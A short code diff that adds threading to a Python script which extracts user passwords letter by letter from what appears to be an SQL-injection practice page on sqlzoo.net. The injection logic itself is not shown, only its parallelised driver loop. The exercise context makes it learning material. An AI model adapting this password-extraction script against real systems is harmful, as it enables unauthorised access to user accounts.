@@ -1,4 +1,5 @@
 import requests, string
+import threading
 
 URL = 'http://sqlzoo.net/hack/passwd.pl'
 LETTERS = string.ascii_lowercase
@@ -74,6 +75,7 @@ def find_password(username):
         loc += 1
 
     print(f'Found complete password for {username}: {current_pwd}')
+    #return username, current_pwd
     results.append((username, current_pwd))
 
 if __name__ == '__main__':
@@ -82,10 +84,15 @@ if __name__ == '__main__':
     print(usernames)
 
     results = [('username', 'password')]
+    threads = []
 
     print('Starting hacking passwords...')
     for username in usernames:
-        find_password(username)
+        temp_thread = threading.Thread(target=find_password, args=(username,))
+        temp_thread.start()
+        threads.append(temp_thread)
+    for thread in threads:
+        thread.join()
 
     print('Final password table:')
     print('*' * 40)
